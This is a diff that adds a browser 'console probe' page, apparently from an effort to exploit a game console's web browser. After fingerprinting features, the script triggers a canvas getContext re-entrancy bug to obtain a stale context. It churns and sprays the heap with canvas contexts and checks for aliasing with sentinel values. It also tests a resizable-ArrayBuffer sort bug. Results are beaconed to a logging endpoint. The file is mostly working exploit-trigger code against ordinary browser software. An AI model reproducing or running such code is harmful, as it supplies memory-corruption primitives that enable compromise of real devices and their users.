@@ -1,0 +1,100 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>console probe</title>
+<body style="background:#111;color:#0f0;font:14px monospace">
+<p id="p">probe</p>
+<script>
+// docs/105 — first console contact after the modal was cleared.
+// Order matters: capabilities first (safe), then the canvas claim (may kill the WebProcess), then the sort
+// claim (safe). Everything beacons, so every stage survives an abort of a later one.
+// The Guide URL carries no query string, so the page is self-configuring.
+(function () {
+  'use strict';
+  function B(m, x) { try { (new Image()).src = '/ev?m=' + encodeURIComponent(String(m)) + (x ? '&' + x : ''); } catch (e) {} }
+  var P = document.body.firstElementChild;
+  function say(s) { P.textContent = s; }
+
+  var feats = ['ArrayBuffer', 'ArrayBuffer.prototype.resize', 'ArrayBuffer.prototype.transfer', 'structuredClone',
+    'MessageChannel', 'createImageBitmap', 'IDBKeyRange', 'Worker', 'SharedWorker', 'navigator.serviceWorker',
+    'indexedDB', 'OffscreenCanvas', 'WebAssembly', 'AudioContext', 'WeakRef', 'FinalizationRegistry', 'fetch'];
+  var caps = [];
+  for (var i = 0; i < feats.length; i++) {
+    var v = 'no';
+    try {
+      var o = window, parts = feats[i].split('.');
+      for (var j = 0; j < parts.length; j++) o = o[parts[j]];
+      v = (typeof o === 'function') ? 'fn' : (typeof o);
+    } catch (e) { v = 'throw'; }
+    caps.push(feats[i] + '=' + v);
+  }
+  var g2 = null;
+  try { var c0 = document.createElement('canvas'); g2 = !!c0.getContext('2d'); } catch (e) {}
+  var gb = null;
+  try { var c1 = document.createElement('canvas'); gb = !!c1.getContext('bitmaprenderer'); } catch (e) {}
+  B('caps', 'canvas2d=' + g2 + '&bitmaprenderer=' + gb + '&ua=' + encodeURIComponent(navigator.userAgent.slice(0, 90)));
+  B('cap2', caps.join('|').slice(0, 600));
+  say('caps done');
+
+  var HAS_RESIZE = (function () { try { return typeof ArrayBuffer.prototype.resize === 'function'; } catch (e) { return false; } })();
+
+  // ---------------- claim 1: canvas same-type occupation as field control (docs/103) ----------------------
+  function canvasArm(next) {
+    var cv = document.createElement('canvas'); cv.width = 8; cv.height = 8; document.body.appendChild(cv);
+    var stale = null;
+    var opts = { get alpha() { try { stale = cv.getContext('2d'); } catch (e) { B('innerfail', 'e=' + e.name); } return false; } };
+    try { cv.getContext('bitmaprenderer', opts); } catch (e) { B('trigfail', 'e=' + e.name); }
+    B('trig', 'stale=' + (stale ? 1 : 0));
+    if (!stale) return next();
+    var keep = [];
+    function spray() {
+      for (var k = 0; k < 500; k++) {
+        var c = document.createElement('canvas'); c.width = 8; c.height = 8; document.body.appendChild(c);
+        try { keep.push(c.getContext('2d')); } catch (e) {}
+      }
+      B('sprayed', 'n=' + keep.length);
+      var SENT = 777.25, hit = -1;
+      try { stale.fillStyle = '#112233'; stale.fillRect(0, 0, 1, 1); B('used', 'ok=1'); }
+      catch (e) { B('used', 'e=' + e.name); }
+      for (var m = 0; m < keep.length; m++) { try { keep[m].translate(SENT + m, 0); } catch (e) {} }
+      try {
+        var t = stale.getTransform();
+        for (var q = 0; q < keep.length; q++) if (Math.abs(t.e - (SENT + q)) < 0.001 || Math.abs(t.f - (SENT + q)) < 0.001) { hit = q; break; }
+        B('sent', 'hit=' + hit + '&e=' + t.e + '&f=' + t.f + '&n=' + keep.length);
+      } catch (e) { B('sentfail', 'e=' + e.name); }
+      say('alias done');
+      next();
+    }
+    // the context is JS-owned: churn (own task) first so the freed slot exists, then occupy it
+    var junk = [];
+    for (var z = 0; z < 400000; z++) junk.push({ k: z });
+    junk = null;
+    B('churn', 'done=1');
+    setTimeout(spray, 30);
+  }
+
+  // ---------------- claim 2: sort on a shrunk view (docs/103) ----------------------------------------------
+  function sortArm(next) {
+    if (!HAS_RESIZE) { B('sort', 'skip=noresize'); return next(); }
+    var buf;
+    try { buf = new ArrayBuffer(256, { maxByteLength: 16384 }); } catch (e) { B('sort', 'mkfail=' + e.name); return next(); }
+    var v = new Uint32Array(buf, 0, 64);
+    for (var i = 0; i < 64; i++) v[i] = 64 - i;
+    var calls = 0;
+    var cmp = function (a, b) { if (calls++ === 0) { try { buf.resize(16); } catch (e) {} } return a - b; };
+    var err = '';
+    try { v.sort(cmp); } catch (e) { err = e.name; }
+    var nz = 0;
+    try { buf.resize(16384); for (var j = 0; j < 64; j++) if (v[j] !== 0) nz++; } catch (e) {}
+    B('sort', 'err=' + (err || '-') + '&calls=' + calls + '&nz=' + nz);
+    next();
+  }
+
+  setTimeout(function () {
+    canvasArm(function () {
+      setTimeout(function () { sortArm(function () { B('done', 'x=1'); say('all done'); }); }, 400);
+    });
+  }, 250);
+})();
+</script>
+</body>
